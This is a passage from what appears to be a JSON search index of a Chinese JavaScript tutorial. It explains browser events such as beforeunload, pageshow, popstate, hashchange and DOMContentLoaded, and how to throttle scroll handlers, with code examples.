volumechange\uff1a\u97f3\u91cf\u53d8\u5316\u65f6\u89e6\u53d1\u3002 ratechange\uff1a\u64ad\u653e\u901f\u5ea6\u6216\u9ed8\u8ba4\u7684\u64ad\u653e\u901f\u5ea6\u53d8\u5316\u65f6\u89e6\u53d1\u3002 abort\uff1a\u505c\u6b62\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u65f6\u89e6\u53d1\uff0c\u901a\u5e38\u662f\u7528\u6237\u4e3b\u52a8\u8981\u6c42\u505c\u6b62\u4e0b\u8f7d\u3002 error\uff1a\u7f51\u7edc\u6216\u5176\u4ed6\u539f\u56e0\u5bfc\u81f4\u5a92\u4f53\u6587\u4ef6\u65e0\u6cd5\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 emptied\uff1a\u7531\u4e8e error \u6216 abort \u4e8b\u4ef6\u5bfc\u81f4 networkState \u5c5e\u6027\u53d8\u6210\u65e0\u6cd5\u83b7\u53d6\u6570\u636e\u65f6\u89e6\u53d1\u3002","title":"\u4e8b\u4ef6"},{"location":"events/common/","text":"\u5176\u4ed6\u5e38\u89c1\u4e8b\u4ef6 \u00b6 \u8d44\u6e90\u4e8b\u4ef6 \u00b6 beforeunload \u4e8b\u4ef6 \u00b6 beforeunload \u4e8b\u4ef6\u5728\u7a97\u53e3\u3001\u6587\u6863\u3001\u5404\u79cd\u8d44\u6e90\u5c06\u8981\u5378\u8f7d\u524d\u89e6\u53d1\u3002\u5b83\u53ef\u4ee5\u7528\u6765\u9632\u6b62\u7528\u6237\u4e0d\u5c0f\u5fc3\u5378\u8f7d\u8d44\u6e90\u3002 \u5982\u679c\u8be5\u4e8b\u4ef6\u5bf9\u8c61\u7684 returnValue \u5c5e\u6027\u662f\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u5c31\u4f1a\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u8be2\u95ee\u7528\u6237\u662f\u5426\u8981\u5378\u8f7d\u8be5\u8d44\u6e90\u3002\u4f46\u662f\uff0c\u7528\u6237\u6307\u5b9a\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u65e0\u6cd5\u663e\u793a\uff0c\u6d4f\u89c8\u5668\u4f1a\u5c55\u793a\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u7528\u6237\u70b9\u51fb\u201c\u53d6\u6d88\u201d\u6309\u94ae\uff0c\u8d44\u6e90\u5c31\u4e0d\u4f1a\u5378\u8f7d\u3002 1 2 3 window . addEventListener ( 'beforeunload' , function ( event ) { event . returnValue = '\u4f60\u786e\u5b9a\u79bb\u5f00\u5417\uff1f' ; }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u5982\u679c\u5173\u95ed\u7a97\u53e3\uff0c\u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3\uff0c\u8981\u6c42\u7528\u6237\u786e\u8ba4\u3002 \u6d4f\u89c8\u5668\u5bf9\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u884c\u4e3a\u5f88\u4e0d\u4e00\u81f4\uff0c\u6709\u7684\u6d4f\u89c8\u5668\u8c03\u7528 event.preventDefault() \uff0c\u4e5f\u4f1a\u5f39\u51fa\u5bf9\u8bdd\u6846\u3002IE \u6d4f\u89c8\u5668\u9700\u8981\u663e\u5f0f\u8fd4\u56de\u4e00\u4e2a\u975e\u7a7a\u7684\u5b57\u7b26\u4e32\uff0c\u624d\u4f1a\u5f39\u51fa\u5bf9\u8bdd\u6846\u3002\u800c\u4e14\uff0c\u5927\u591a\u6570\u6d4f\u89c8\u5668\u5728\u5bf9\u8bdd\u6846\u4e2d\u4e0d\u663e\u793a\u6307\u5b9a\u6587\u672c\uff0c\u53ea\u663e\u793a\u9ed8\u8ba4\u6587\u672c\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\uff0c\u53d6\u5f97\u6700\u5927\u7684\u517c\u5bb9\u6027\u3002 1 2 3 4 5 6 window . addEventListener ( 'beforeunload' , function ( e ) { var confirmationMessage = '\u786e\u8ba4\u5173\u95ed\u7a97\u53e3\uff1f' ; e . returnValue = confirmationMessage ; return confirmationMessage ; }); \u6ce8\u610f\uff0c\u8bb8\u591a\u624b\u673a\u6d4f\u89c8\u5668\uff08\u6bd4\u5982 Safari\uff09\u9ed8\u8ba4\u5ffd\u7565\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u684c\u9762\u6d4f\u89c8\u5668\u4e5f\u6709\u529e\u6cd5\u5ffd\u7565\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u6240\u4ee5\uff0c\u5b83\u53ef\u80fd\u6839\u672c\u4e0d\u4f1a\u751f\u6548\uff0c\u4e0d\u80fd\u4f9d\u8d56\u5b83\u6765\u963b\u6b62\u7528\u6237\u5173\u95ed\u6d4f\u89c8\u5668\u7a97\u53e3\uff0c\u6700\u597d\u4e0d\u8981\u4f7f\u7528\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u53e6\u5916\uff0c\u4e00\u65e6\u4f7f\u7528\u4e86 beforeunload \u4e8b\u4ef6\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u7f13\u5b58\u5f53\u524d\u7f51\u9875\uff0c\u4f7f\u7528\u201c\u56de\u9000\u201d\u6309\u94ae\u5c06\u91cd\u65b0\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u7f51\u9875\u3002\u8fd9\u662f\u56e0\u4e3a\u76d1\u542c\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76ee\u7684\uff0c\u4e00\u822c\u662f\u4e3a\u4e86\u7f51\u9875\u72b6\u6001\uff0c\u8fd9\u65f6\u7f13\u5b58\u9875\u9762\u7684\u521d\u59cb\u72b6\u6001\u5c31\u6ca1\u610f\u4e49\u4e86\u3002 unload \u4e8b\u4ef6 \u00b6 unload \u4e8b\u4ef6\u5728\u7a97\u53e3\u5173\u95ed\u6216\u8005 document \u5bf9\u8c61\u5c06\u8981\u5378\u8f7d\u65f6\u89e6\u53d1\u3002\u5b83\u7684\u89e6\u53d1\u987a\u5e8f\u6392\u5728 beforeunload \u3001 pagehide \u4e8b\u4ef6\u540e\u9762\u3002 unload \u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u6587\u6863\u5904\u4e8e\u4e00\u4e2a\u7279\u6b8a\u72b6\u6001\u3002\u6240\u6709\u8d44\u6e90\u4f9d\u7136\u5b58\u5728\uff0c\u4f46\u662f\u5bf9\u7528\u6237\u6765\u8bf4\u90fd\u4e0d\u53ef\u89c1\uff0cUI \u4e92\u52a8\u5168\u90e8\u65e0\u6548\u3002\u8fd9\u4e2a\u4e8b\u4ef6\u662f\u65e0\u6cd5\u53d6\u6d88\u7684\uff0c\u5373\u4f7f\u5728\u76d1\u542c\u51fd\u6570\u91cc\u9762\u629b\u51fa\u9519\u8bef\uff0c\u4e5f\u4e0d\u80fd\u505c\u6b62\u6587\u6863\u7684\u5378\u8f7d\u3002 1 2 3 window . addEventListener ( 'unload' , function ( event ) { console . log ( '\u6587\u6863\u5c06\u8981\u5378\u8f7d' ); }); \u624b\u673a\u4e0a\uff0c\u6d4f\u89c8\u5668\u6216\u7cfb\u7edf\u53ef\u80fd\u4f1a\u76f4\u63a5\u4e22\u5f03\u7f51\u9875\uff0c\u8fd9\u65f6\u8be5\u4e8b\u4ef6\u6839\u672c\u4e0d\u4f1a\u53d1\u751f\u3002\u800c\u4e14\u8ddf beforeunload \u4e8b\u4ef6\u4e00\u6837\uff0c\u4e00\u65e6\u4f7f\u7528\u4e86 unload \u4e8b\u4ef6\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u7f13\u5b58\u5f53\u524d\u7f51\u9875\uff0c\u7406\u7531\u540c\u4e0a\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4e0d\u5e94\u8be5\u4f9d\u8d56\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u6307\u5b9a\u7f51\u9875\u5378\u8f7d\u65f6\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u8003\u8651\u5b8c\u5168\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u8be5\u4e8b\u4ef6\u53ef\u4ee5\u7528 pagehide \u4ee3\u66ff\u3002 load \u4e8b\u4ef6\uff0cerror \u4e8b\u4ef6 \u00b6 load \u4e8b\u4ef6\u5728\u9875\u9762\u6216\u67d0\u4e2a\u8d44\u6e90\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002\u6ce8\u610f\uff0c\u9875\u9762\u6216\u8d44\u6e90\u4ece\u6d4f\u89c8\u5668\u7f13\u5b58\u52a0\u8f7d\uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\u3002 1 2 3 window . addEventListener ( 'load' , function ( event ) { console . log ( '\u6240\u6709\u8d44\u6e90\u90fd\u52a0\u8f7d\u5b8c\u6210' ); }); error \u4e8b\u4ef6\u662f\u5728\u9875\u9762\u6216\u8d44\u6e90\u52a0\u8f7d\u5931\u8d25\u65f6\u89e6\u53d1\u3002 abort \u4e8b\u4ef6\u5728\u7528\u6237\u53d6\u6d88\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002 \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\u5b9e\u9645\u4e0a\u5c5e\u4e8e\u8fdb\u5ea6\u4e8b\u4ef6\uff0c\u4e0d\u4ec5\u53d1\u751f\u5728 document \u5bf9\u8c61\uff0c\u8fd8\u53d1\u751f\u5728\u5404\u79cd\u5916\u90e8\u8d44\u6e90\u4e0a\u9762\u3002\u6d4f\u89c8\u7f51\u9875\u5c31\u662f\u4e00\u4e2a\u52a0\u8f7d\u5404\u79cd\u8d44\u6e90\u7684\u8fc7\u7a0b\uff0c\u56fe\u50cf\uff08image\uff09\u3001\u6837\u5f0f\u8868\uff08style sheet\uff09\u3001\u811a\u672c\uff08script\uff09\u3001\u89c6\u9891\uff08video\uff09\u3001\u97f3\u9891\uff08audio\uff09\u3001Ajax\u8bf7\u6c42\uff08XMLHttpRequest\uff09\u7b49\u7b49\u3002\u8fd9\u4e9b\u8d44\u6e90\u548c document \u5bf9\u8c61\u3001 window \u5bf9\u8c61\u3001XMLHttpRequestUpload \u5bf9\u8c61\uff0c\u90fd\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\u548c error \u4e8b\u4ef6\u3002 \u6700\u540e\uff0c\u9875\u9762\u7684 load \u4e8b\u4ef6\u4e5f\u53ef\u4ee5\u7528 pageshow \u4e8b\u4ef6\u4ee3\u66ff\u3002 session \u5386\u53f2\u4e8b\u4ef6 \u00b6 pageshow \u4e8b\u4ef6\uff0cpagehide \u4e8b\u4ef6 \u00b6 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6d4f\u89c8\u5668\u4f1a\u5728\u5f53\u524d\u4f1a\u8bdd\uff08session\uff09\u7f13\u5b58\u9875\u9762\uff0c\u5f53\u7528\u6237\u70b9\u51fb\u201c\u524d\u8fdb/\u540e\u9000\u201d\u6309\u94ae\u65f6\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\u9875\u9762\u3002 pageshow \u4e8b\u4ef6\u5728\u9875\u9762\u52a0\u8f7d\u65f6\u89e6\u53d1\uff0c\u5305\u62ec\u7b2c\u4e00\u6b21\u52a0\u8f7d\u548c\u4ece\u7f13\u5b58\u52a0\u8f7d\u4e24\u79cd\u60c5\u51b5\u3002\u5982\u679c\u8981\u6307\u5b9a\u9875\u9762\u6bcf\u6b21\u52a0\u8f7d\uff08\u4e0d\u7ba1\u662f\u4e0d\u662f\u4ece\u6d4f\u89c8\u5668\u7f13\u5b58\uff09\u65f6\u90fd\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u653e\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 \u7b2c\u4e00\u6b21\u52a0\u8f7d\u65f6\uff0c\u5b83\u7684\u89e6\u53d1\u987a\u5e8f\u6392\u5728 load \u4e8b\u4ef6\u540e\u9762\u3002\u4ece\u7f13\u5b58\u52a0\u8f7d\u65f6\uff0c load \u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\uff0c\u56e0\u4e3a\u7f51\u9875\u5728\u7f13\u5b58\u4e2d\u7684\u6837\u5b50\u901a\u5e38\u662f load \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u8fd0\u884c\u540e\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u4e0d\u5fc5\u91cd\u590d\u6267\u884c\u3002\u540c\u7406\uff0c\u5982\u679c\u662f\u4ece\u7f13\u5b58\u4e2d\u52a0\u8f7d\u9875\u9762\uff0c\u7f51\u9875\u5185\u521d\u59cb\u5316\u7684 JavaScript \u811a\u672c\uff08\u6bd4\u5982 DOMContentLoaded \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff09\u4e5f\u4e0d\u4f1a\u6267\u884c\u3002 1 2 3 window . addEventListener ( 'pageshow' , function ( event ) { console . log ( 'pageshow: ' , event ); }); pageshow \u4e8b\u4ef6\u6709\u4e00\u4e2a persisted \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002\u9875\u9762\u7b2c\u4e00\u6b21\u52a0\u8f7d\u65f6\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f false \uff1b\u5f53\u9875\u9762\u4ece\u7f13\u5b58\u52a0\u8f7d\u65f6\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f true \u3002 1 2 3 4 5 window . addEventListener ( 'pageshow' , function ( event ){ if ( event . persisted ) { // ... } }); pagehide \u4e8b\u4ef6\u4e0e pageshow \u4e8b\u4ef6\u7c7b\u4f3c\uff0c\u5f53\u7528\u6237\u901a\u8fc7\u201c\u524d\u8fdb/\u540e\u9000\u201d\u6309\u94ae\uff0c\u79bb\u5f00\u5f53\u524d\u9875\u9762\u65f6\u89e6\u53d1\u3002\u5b83\u4e0e unload \u4e8b\u4ef6\u7684\u533a\u522b\u5728\u4e8e\uff0c\u5982\u679c\u5728 window \u5bf9\u8c61\u4e0a\u5b9a\u4e49 unload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u540e\uff0c\u9875\u9762\u4e0d\u4f1a\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff0c\u800c\u4f7f\u7528 pagehide \u4e8b\u4ef6\uff0c\u9875\u9762\u4f1a\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\u3002 pagehide \u4e8b\u4ef6\u5b9e\u4f8b\u4e5f\u6709\u4e00\u4e2a persisted \u5c5e\u6027\uff0c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u4e3a true \uff0c\u5c31\u8868\u793a\u9875\u9762\u8981\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff1b\u8bbe\u4e3a false \uff0c\u8868\u793a\u7f51\u9875\u4e0d\u4fdd\u5b58\u5728\u7f13\u5b58\u4e2d\uff0c\u8fd9\u65f6\u5982\u679c\u8bbe\u7f6e\u4e86unload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c06\u5728 pagehide \u4e8b\u4ef6\u540e\u7acb\u5373\u8fd0\u884c\u3002 \u5982\u679c\u9875\u9762\u5305\u542b <frame> \u6216 <iframe> \u5143\u7d20\uff0c\u5219 <frame> \u9875\u9762\u7684 pageshow \u4e8b\u4ef6\u548c pagehide \u4e8b\u4ef6\uff0c\u90fd\u4f1a\u5728\u4e3b\u9875\u9762\u4e4b\u524d\u89e6\u53d1\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u53ea\u5728\u6d4f\u89c8\u5668\u7684 history \u5bf9\u8c61\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u8ddf\u7f51\u9875\u662f\u5426\u53ef\u89c1\u6ca1\u6709\u5173\u7cfb\u3002 popstate \u4e8b\u4ef6 \u00b6 popstate \u4e8b\u4ef6\u5728\u6d4f\u89c8\u5668\u7684 history \u5bf9\u8c61\u7684\u5f53\u524d\u8bb0\u5f55\u53d1\u751f\u663e\u5f0f\u5207\u6362\u65f6\u89e6\u53d1\u3002\u6ce8\u610f\uff0c\u8c03\u7528 history.pushState() \u6216 history.replaceState() \uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u53ea\u5728\u7528\u6237\u5728 history \u8bb0\u5f55\u4e4b\u95f4\u663e\u5f0f\u5207\u6362\u65f6\u89e6\u53d1\uff0c\u6bd4\u5982\u9f20\u6807\u70b9\u51fb\u201c\u540e\u9000/\u524d\u8fdb\u201d\u6309\u94ae\uff0c\u6216\u8005\u5728\u811a\u672c\u4e2d\u8c03\u7528 history.back() \u3001 history.forward() \u3001 history.go() \u65f6\u89e6\u53d1\u3002 \u8be5\u4e8b\u4ef6\u5bf9\u8c61\u6709\u4e00\u4e2a state \u5c5e\u6027\uff0c\u4fdd\u5b58 history.pushState \u65b9\u6cd5\u548c history.replaceState \u65b9\u6cd5\u4e3a\u5f53\u524d\u8bb0\u5f55\u6dfb\u52a0\u7684 state \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 window . onpopstate = function ( event ) { console . log ( 'state: ' + event . state ); }; history . pushState ({ page : 1 }, 'title 1' , '?page=1' ); history . pushState ({ page : 2 }, 'title 2' , '?page=2' ); history . replaceState ({ page : 3 }, 'title 3' , '?page=3' ); history . back (); // state: {\"page\":1} history . back (); // state: null history . go ( 2 ); // state: {\"page\":3} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c pushState \u65b9\u6cd5\u5411 history \u6dfb\u52a0\u4e86\u4e24\u6761\u8bb0\u5f55\uff0c\u7136\u540e replaceState \u65b9\u6cd5\u66ff\u6362\u6389\u5f53\u524d\u8bb0\u5f55\u3002\u56e0\u6b64\uff0c\u8fde\u7eed\u4e24\u6b21 back \u65b9\u6cd5\uff0c\u4f1a\u8ba9\u5f53\u524d\u6761\u76ee\u9000\u56de\u5230\u539f\u59cb\u7f51\u5740\uff0c\u5b83\u6ca1\u6709\u9644\u5e26 state \u5bf9\u8c61\uff0c\u6240\u4ee5\u4e8b\u4ef6\u7684 state \u5c5e\u6027\u4e3a null \uff0c\u7136\u540e\u524d\u8fdb\u4e24\u6761\u8bb0\u5f55\uff0c\u53c8\u56de\u5230 replaceState \u65b9\u6cd5\u6dfb\u52a0\u7684\u8bb0\u5f55\u3002 \u6d4f\u89c8\u5668\u5bf9\u4e8e\u9875\u9762\u9996\u6b21\u52a0\u8f7d\uff0c\u662f\u5426\u89e6\u53d1 popstate \u4e8b\u4ef6\uff0c\u5904\u7406\u4e0d\u4e00\u6837\uff0cFirefox \u4e0d\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 hashchange \u4e8b\u4ef6 \u00b6 hashchange \u4e8b\u4ef6\u5728 URL \u7684 hash \u90e8\u5206\uff08\u5373 # \u53f7\u540e\u9762\u7684\u90e8\u5206\uff0c\u5305\u62ec # \u53f7\uff09\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002\u8be5\u4e8b\u4ef6\u4e00\u822c\u5728 window \u5bf9\u8c61\u4e0a\u76d1\u542c\u3002 hashchange \u7684\u4e8b\u4ef6\u5b9e\u4f8b\u5177\u6709\u4e24\u4e2a\u7279\u6709\u5c5e\u6027\uff1a oldURL \u5c5e\u6027\u548c newURL \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u53d8\u5316\u524d\u540e\u7684\u5b8c\u6574 URL\u3002 1 2 3 4 5 6 7 8 9 10 11 // URL \u662f http://www.example.com/ window . addEventListener ( 'hashchange' , myFunction ); function myFunction ( e ) { console . log ( e . oldURL ); console . log ( e . newURL ); } location . hash = 'part2' ; // http://www.example.com/ // http://www.example.com/#part2 \u7f51\u9875\u72b6\u6001\u4e8b\u4ef6 \u00b6 DOMContentLoaded \u4e8b\u4ef6 \u00b6 \u7f51\u9875\u4e0b\u8f7d\u5e76\u89e3\u6790\u5b8c\u6210\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u5728 document \u5bf9\u8c61\u4e0a\u89e6\u53d1 DOMContentLoaded \u4e8b\u4ef6\u3002\u8fd9\u65f6\uff0c\u4ec5\u4ec5\u5b8c\u6210\u4e86\u7f51\u9875\u7684\u89e3\u6790\uff08\u6574\u5f20\u9875\u9762\u7684 DOM \u751f\u6210\u4e86\uff09\uff0c\u6240\u6709\u5916\u90e8\u8d44\u6e90\uff08\u6837\u5f0f\u8868\u3001\u811a\u672c\u3001iframe \u7b49\u7b49\uff09\u53ef\u80fd\u8fd8\u6ca1\u6709\u4e0b\u8f7d\u7ed3\u675f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u6bd4 load \u4e8b\u4ef6\uff0c\u53d1\u751f\u65f6\u95f4\u65e9\u5f97\u591a\u3002 1 2 3 document . addEventListener ( 'DOMContentLoaded' , function ( event ) { console . log ( 'DOM\u751f\u6210' ); }); \u6ce8\u610f\uff0c\u7f51\u9875\u7684 JavaScript \u811a\u672c\u662f\u540c\u6b65\u6267\u884c\u7684\uff0c\u811a\u672c\u4e00\u65e6\u53d1\u751f\u5835\u585e\uff0c\u5c06\u63a8\u8fdf\u89e6\u53d1 DOMContentLoaded \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 document . addEventListener ( 'DOMContentLoaded' , function ( event ) { console . log ( 'DOM \u751f\u6210' ); }); // \u8fd9\u6bb5\u4ee3\u7801\u4f1a\u63a8\u8fdf\u89e6\u53d1 DOMContentLoaded \u4e8b\u4ef6 for ( var i = 0 ; i < 1000000000 ; i ++ ) { // ... } readystatechange \u4e8b\u4ef6 \u00b6 readystatechange \u4e8b\u4ef6\u5f53 Document \u5bf9\u8c61\u548c XMLHttpRequest \u5bf9\u8c61\u7684 readyState \u5c5e\u6027\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002 document.readyState \u6709\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff1a loading \uff08\u7f51\u9875\u6b63\u5728\u52a0\u8f7d\uff09\u3001 interactive \uff08\u7f51\u9875\u5df2\u7ecf\u89e3\u6790\u5b8c\u6210\uff0c\u4f46\u662f\u5916\u90e8\u8d44\u6e90\u4ecd\u7136\u5904\u5728\u52a0\u8f7d\u72b6\u6001\uff09\u548c complete \uff08\u7f51\u9875\u548c\u6240\u6709\u5916\u90e8\u8d44\u6e90\u5df2\u7ecf\u7ed3\u675f\u52a0\u8f7d\uff0c load \u4e8b\u4ef6\u5373\u5c06\u89e6\u53d1\uff09\u3002 1 2 3 4 5 document . onreadystatechange = function () { if ( document . readyState === 'interactive' ) { // ... } } \u8fd9\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u770b\u4f5c DOMContentLoaded \u4e8b\u4ef6\u7684\u53e6\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u3002 \u7a97\u53e3\u4e8b\u4ef6 \u00b6 scroll \u4e8b\u4ef6 \u00b6 scroll \u4e8b\u4ef6\u5728\u6587\u6863\u6216\u6587\u6863\u5143\u7d20\u6eda\u52a8\u65f6\u89e6\u53d1\uff0c\u4e3b\u8981\u51fa\u73b0\u5728\u7528\u6237\u62d6\u52a8\u6eda\u52a8\u6761\u3002 1 window . addEventListener ( 'scroll' , callback ); \u8be5\u4e8b\u4ef6\u4f1a\u8fde\u7eed\u5730\u5927\u91cf\u89e6\u53d1\uff0c\u6240\u4ee5\u5b83\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u4e2d\u4e0d\u5e94\u8be5\u6709\u975e\u5e38\u8017\u8d39\u8ba1\u7b97\u7684\u64cd\u4f5c\u3002\u63a8\u8350\u7684\u505a\u6cd5\u662f\u4f7f\u7528 requestAnimationFrame \u6216 setTimeout \u63a7\u5236\u8be5\u4e8b\u4ef6\u7684\u89e6\u53d1\u9891\u7387\uff0c\u7136\u540e\u53ef\u4ee5\u7ed3\u5408 customEvent \u629b\u51fa\u4e00\u4e2a\u65b0\u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ( function () { var throttle = function ( type , name , obj ) { var obj = obj || window ; var running = false ; var func = function () { if ( running ) { return ; } running = true ; requestAnimationFrame ( function () { obj . dispatchEvent ( new CustomEvent ( name )); running = false ; }); }; obj . addEventListener ( type , func ); }; // \u5c06 scroll \u4e8b\u4ef6\u8f6c\u4e3a optimizedScroll \u4e8b\u4ef6 throttle ( 'scroll' , 'optimizedScroll' ); })(); window . addEventListener ( 'optimizedScroll' , function () { console . log ( 'Resource conscious scroll callback!' ); }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c throttle() \u51fd\u6570\u7528\u4e8e\u63a7\u5236\u4e8b\u4ef6\u89e6\u53d1\u9891\u7387\uff0c\u5b83\u6709\u4e00\u4e2a\u5185\u90e8\u51fd\u6570 func() \uff0c\u6bcf\u6b21 scroll \u4e8b\u4ef6\u5b9e\u9645\u4e0a\u89e6\u53d1\u7684\u662f\u8fd9\u4e2a\u51fd\u6570\u3002 func() \u51fd\u6570\u5185\u90e8\u4f7f\u7528 requestAnimationFrame() \u65b9\u6cd5\uff0c\u4fdd\u8bc1\u53ea\u6709\u6bcf\u6b21\u9875\u9762\u91cd\u7ed8\u65f6\uff08\u6bcf\u79d260\u6b21\uff09\uff0c\u624d\u53ef\u80fd\u4f1a\u89e6\u53d1 optimizedScroll \u4e8b\u4ef6\uff0c\u4ece\u800c\u5b9e\u9645\u4e0a\u5c06 scroll \u4e8b\u4ef6\u8f6c\u6362\u4e3a optimizedScroll \u4e8b\u4ef6\uff0c\u89e6\u53d1\u9891\u7387\u88ab\u63a7\u5236\u5728\u6bcf\u79d2\u6700\u591a60\u6b21\u3002 \u6539\u7528 setTimeout() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u653e\u7f6e\u66f4\u5927\u7684\u65f6\u95f4\u95f4\u9694\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ( function () { window . addEventListener ( 'scroll' , scrollThrottler , false ); var scrollTimeout ; function scrollThrottler () { if ( ! scrollTimeout ) { scrollTimeout = setTimeout ( function () { scrollTimeout = null ; actualScrollHandler (); }, 66 ); } } function actualScrollHandler () { // ... } }()); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u6b21 scroll \u4e8b\u4ef6\u90fd\u4f1a\u6267\u884c scrollThrottler \u51fd\u6570\u3002\u8be5\u51fd\u6570\u91cc\u9762\u6709\u4e00\u4e2a\u5b9a\u65f6\u5668 setTimeout \uff0c\u6bcf66\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21\uff08\u6bcf\u79d215\u6b21\uff09\u771f\u6b63\u6267\u884c\u7684\u4efb\u52a1 actualScrollHandler \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u4e00\u822c\u7684 throttle \u51fd\u6570\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 function throttle ( fn , wait ) { var time = Date . now (); return function () { if (( time + wait - Date . now ()) < 0 ) { fn (); time = Date . now (); } } } window . addEventListener ( 'scroll' , throttle ( callback , 1000 )); \u4e0a\u9762\u7684\u4ee3\u7801\u5c06 scroll \u4e8b\u4ef6\u7684\u89e6\u53d1\u9891\u7387\uff0c\u9650\u5236\u5728\u4e00\u79d2\u4e00\u6b21\u3002 lodash \u51fd\u6570\u5e93\u63d0\u4f9b\u4e86\u73b0\u6210\u7684 throttle \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002 1 window . addEventListener ( 'scroll' , _ . throttle ( callback , 1000 )); \u672c\u4e66\u524d\u9762\u4ecb\u7ecd\u8fc7 debounce \u7684\u6982\u5ff5\uff0c throttle \u4e0e\u5b83\u533a\u522b\u5728\u4e8e\uff0c throttle \u662f\u201c\u8282\u6d41\u201d\uff0c\u786e\u4fdd\u4e00\u6bb5\u65f6\u95f4\u5185\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u800c debounce \u662f\u201c\u9632\u6296\u201d\uff0c\u8981\u8fde\u7eed\u64cd\u4f5c\u7ed3\u675f\u540e\u518d\u6267\u884c\u3002\u4ee5\u7f51\u9875\u6eda\u52a8\u4e3a\u4f8b\uff0c debounce \u8981\u7b49\u5230\u7528\u6237\u505c\u6b62\u6eda\u52a8\u540e\u624d\u6267\u884c\uff0c throttle \u5219\u662f\u5982\u679c\u7528\u6237\u4e00\u76f4\u5728\u6eda\u52a8\u7f51\u9875\uff0c\u90a3\u4e48\u5728\u6eda\u52a8\u8fc7\u7a0b\u4e2d\u8fd8\u662f\u4f1a\u6267\u884c\u3002 resize \u4e8b\u4ef6 \u00b6 resize \u4e8b\u4ef6\u5728\u6539\u53d8\u6d4f\u89c8\u5668\u7a97\u53e3\u5927\u5c0f\u65f6\u89e6\u53d1\uff0c\u4e3b\u8981\u53d1\u751f\u5728 window \u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 6 7 var resizeMethod = function () { if 